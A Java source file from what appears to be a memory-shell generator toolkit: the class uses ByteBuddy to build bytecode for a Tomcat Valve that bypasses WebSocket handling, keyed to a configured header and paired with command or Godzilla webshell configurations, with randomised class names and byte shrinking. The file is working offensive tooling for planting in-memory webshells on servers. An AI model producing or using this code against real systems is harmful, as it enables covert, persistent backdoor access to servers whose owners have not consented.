package com.reajason.javaweb.memshell.generator;

import com.reajason.javaweb.ClassBytesShrink;
import com.reajason.javaweb.GenerationException;
import com.reajason.javaweb.Server;
import com.reajason.javaweb.buddy.ServletRenameVisitorWrapper;
import com.reajason.javaweb.buddy.TargetJreVersionVisitorWrapper;
import com.reajason.javaweb.memshell.config.CommandConfig;
import com.reajason.javaweb.memshell.config.GodzillaConfig;
import com.reajason.javaweb.memshell.config.ShellConfig;
import com.reajason.javaweb.memshell.config.ShellToolConfig;
import com.reajason.javaweb.memshell.shelltool.wsbypass.TomcatWsBypassValve;
import com.reajason.javaweb.utils.CommonUtil;
import net.bytebuddy.ByteBuddy;
import net.bytebuddy.dynamic.DynamicType;
import org.apache.commons.lang3.tuple.Pair;

import static net.bytebuddy.matcher.ElementMatchers.named;

/**
 * @author ReaJason
 * @since 2026/1/13
 */
public class WebSocketByPassHelperGenerator {
    public static byte[] getBytes(ShellConfig shellConfig, ShellToolConfig shellToolConfig) {
        Pair<String, String> headerPair = getHeaderPair(shellToolConfig);
        if (headerPair == null) {
            throw new GenerationException("unsupported shell config: " + shellConfig.getShellTool());
        }

        if (Server.Tomcat.equals(shellConfig.getServer())) {
            DynamicType.Builder<TomcatWsBypassValve> builder = new ByteBuddy()
                    .redefine(TomcatWsBypassValve.class)
                    .visit(new TargetJreVersionVisitorWrapper(shellConfig.getTargetJreVersion()))
                    .field(named("headerName")).value(headerPair.getKey())
                    .field(named("headerValue")).value(headerPair.getValue())
                    .name(CommonUtil.generateClassName());
            if (shellConfig.isJakarta()) {
                builder = builder.visit(ServletRenameVisitorWrapper.INSTANCE);
            }
            try (DynamicType.Unloaded<TomcatWsBypassValve> dynamicType = builder.make()) {
                return ClassBytesShrink.shrink(dynamicType.getBytes(), shellConfig.isShrink());
            }
        }
        return null;
    }

    private static Pair<String, String> getHeaderPair(ShellToolConfig shellToolConfig) {
        if (shellToolConfig instanceof CommandConfig) {
            return Pair.of(((CommandConfig) shellToolConfig).getHeaderName(), ((CommandConfig) shellToolConfig).getHeaderValue());
        } else if (shellToolConfig instanceof GodzillaConfig) {
            return Pair.of(((GodzillaConfig) shellToolConfig).getHeaderName(), ((GodzillaConfig) shellToolConfig).getHeaderValue());
        }
        return null;
    }
}
